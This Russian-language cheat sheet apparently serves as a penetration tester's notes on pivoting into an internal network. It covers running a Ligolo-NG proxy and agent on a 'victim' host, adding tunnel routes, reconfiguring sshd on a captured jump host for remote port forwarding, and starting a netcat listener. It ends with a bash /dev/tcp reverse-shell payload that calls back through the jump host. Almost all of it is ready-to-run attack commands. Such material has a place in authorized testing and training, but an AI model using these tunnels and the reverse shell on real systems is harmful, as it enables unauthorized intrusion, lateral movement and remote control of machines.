# Ligolo-NG

> Данный вид туннеля позволяет напрямую обращаться к хостам из внутренней сети. При этом сами хосты не могут обратиться к нам. Нужно дополнительно пробрасывать порты через SSH или chisel.

На своем хосте нужно иметь ligolo-proxy, на жертве - ligolo-agent. Перенести ligolo-agent можно, например, через ```python3 -m http.server 8088```.

1. На своем хосте запускаем ligolo-server:

```
sudo ~/tools/ligolo/proxy -selfcert -laddr 0.0.0.0:6666 -api-laddr 127.0.0.1:8081
```

Флаги:

- ```-laddr``` - сменить порт по умолчанию (```default: 11601```)
- ```-api-laddr``` - сменить порт API по умолчанию (```default: 8080```), если вдруг порт 8080 занят чем-то другим

2. На жертве запускаем ligolo-agent:

```
./agent.sh -connect 192.168.1.100:6666 -ignore-cert
```

3. На своем хосте видим прилетевшую сессию, делаем следующее:

Выбираем активную сессию:

```
session
```

Стрелками выбираем нужную сессию и нажимаем ```enter```.

Далее создаем интерфейс:

```
interface_create --name lig1
```

Добавляем маршрут во внутреннюю сеть через созданный интерфейс:

```
route_add --name lig1 --route 10.10.10.0/24
```

И запускаем туннель:

```
tunnel_start --tun lig1
```

Далее можем сканировать внутреннюю сеть.

## Проброс удаленного порта на наш хост

> Пример: мы открываем у себя порт 4444 для rshell, но уязвимый хост Internal из внутренней сети не может достучаться до нас напрямую. Поэтому мы открываем 4444 порт на SSH-сервере Jump, который будет перенаправлять все подключения на наш порт 4444.
>
> В итоге должна получиться схема:
>
> Internal 10.10.10.5 -> Jump 10.10.10.1:4444 -> SSH туннель -> Kali 4444 

Для начала необходимо выполнить некоторые настройки на своем хосте и на уже захваченном.

На своем хосте:

```
sudo sysctl -w net.ipv4.ip_forward=1
```

А на удаленном хосте редачим конфиг SSH:

```
nano /etc/ssh/sshd_config
```

Ищем там строку ```GatewayPorts```, раскомменчиваем ее и заменяем ```no``` на ```yes```.

Далее перезапускаем SSH:

```
systemctl restart ssh
```

После этого можем пробрасывать порт:

```
ssh user@192.168.0.100 -R 4444:0.0.0.0:4444
```

На удаленном хосте можем убедиться, что порт открыт при помощи команды:

```
ss -tulpn
```

Должны увидеть ```0.0.0.0:4444```.

После чего можем запустить у себя nc:

```
rlwrap nc -lvnp 4444
```

Сгенерировать нагрузку для Reverse Shell, при этом хост Internal из внутренней сети будет обращаться к промежуточному хосту Jump 192.168.0.100 на внутренний адрес 10.10.10.1, например:

```
/bin/sh -i >& /dev/tcp/10.10.10.1/4444 0>&1
```
